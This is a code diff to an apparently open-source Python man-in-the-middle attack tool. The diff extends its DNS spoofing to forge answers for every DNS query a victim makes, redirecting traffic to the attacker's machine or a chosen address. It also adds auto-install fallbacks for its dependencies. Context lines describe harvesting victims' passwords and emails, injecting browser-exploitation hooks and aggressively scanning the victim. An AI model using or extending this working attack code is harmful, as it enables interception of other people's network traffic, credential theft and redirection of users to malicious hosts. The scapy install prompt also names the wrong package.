@@ -30,23 +30,40 @@ except Exception:
 	nfq = raw_input('[-] python-nfqueue not installed, would you like to install now? (apt-get install -y python-nfqueue will be run if yes) [y/n]: ')
 	if nfq == 'y':
 		os.system('apt-get install -y python-nfqueue')
+		import nfqueue
 	else:
 		exit('[-] Exiting due to missing dependency')
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
+try:
+	from scapy.all import *
+except Exception:
+	scpy = raw_input('[-] python-scapy not installed, would you like to install now? (apt-get install -y python-nfqueue will be run if yes) [y/n]: ')
+	if scpy == 'y':
+		os.system('apt-get install -y python-scapy')
+		from scapy.all import *
+	else:
+		exit('[-] Exiting due to missing dependency')
 conf.verb=0
 #Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
 conf.checkIPaddr=0
+try:
+	from twisted.internet import reactor
+except Exception:
+	twstd = raw_input('[-] python-twisted not installed, would you like to install now? (apt-get install -y python-twisted will be run if yes) [y/n]: ')
+	if twstd == 'y':
+		os.system('apt-get install -y python-twisted')
+		from twisted.internet import reactor
+	else:
+		exit('[-] Exiting due to missing dependency')
+from twisted.internet.interfaces import IReadDescriptor
+from twisted.internet.protocol import Protocol, Factory
 from sys import exit
 from threading import Thread
 import argparse
 import signal
 from base64 import b64decode
 from subprocess import *
-from twisted.internet import reactor
-from twisted.internet.interfaces import IReadDescriptor
-from twisted.internet.protocol import Protocol, Factory
 from zlib import decompressobj, decompress
 import gzip
 from cStringIO import StringIO
@@ -64,6 +81,7 @@ def parse_args():
 	parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
 	parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
 	parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
+	parser.add_argument("-a", "--dnsall", help="Spoof all DNS responses", action="store_true")
 	parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
 	parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP username/password combos for you.", action="store_true")
 	parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
@@ -167,7 +185,7 @@ class Parser():
 						self.http_parser(load, ack, dport)
 						if self.args.beef or self.args.code:
 							self.injecthtml(load, ack, pkt, payload, dport, sport)
-		if self.args.dnsspoof:
+		if self.args.dnsspoof or self.args.dnsall:
 			if pkt.haslayer(DNSQR):
 				dport = pkt[UDP].dport
 				sport = pkt[UDP].sport
@@ -701,20 +719,31 @@ class Parser():
 	# Spoof DNS for a specific domain to point to your machine
 	# Make this more reliable by blocking all DNS responses from the server using the IP_src maybe a self.dnsSrc var
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
+		localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 		if self.args.dnsspoof:
 			if self.args.dnsspoof in dns_layer.qd.qname and not self.args.redirectto:
-				localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)
 			elif self.args.dnsspoof in dns_layer.qd.qname and self.args.redirectto:
 				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
+		elif self.args.dnsall:
+			if self.args.redirectto:
+				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
+			else:
+				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)
+
 
 	def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
 #		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
 #		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
 		p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
 		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
-		print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
-		logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+' to '+rIP+'\n')
+		if self.args.dnsspoof:
+			print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
+			logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+G+' to '+rIP+'\n')
+		elif self.args.dnsall:
+			print G+'[!] Sent spoofed packet for '+W+dns_layer[DNSQR].qname[:-1]+G+' to '+W+rIP
+			logger.write('[!] Sent spoofed packet for '+dns_layer[DNSQR].qname[:-1]+' to '+rIP+'\n')
+
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
